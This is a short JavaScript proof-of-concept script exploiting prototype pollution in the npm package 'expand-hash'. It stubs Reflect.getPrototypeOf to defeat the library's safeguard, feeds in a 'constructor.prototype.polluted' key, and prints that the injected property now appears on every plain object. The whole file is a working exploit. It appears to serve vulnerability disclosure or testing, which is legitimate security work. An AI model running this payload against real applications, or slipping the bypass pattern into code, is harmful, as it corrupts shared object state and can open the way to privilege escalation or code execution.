Reflect.getPrototypeOf = () => false;
var expandHash = require('expand-hash');
var obj = {};
console.log({}.polluted);
expandHash({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);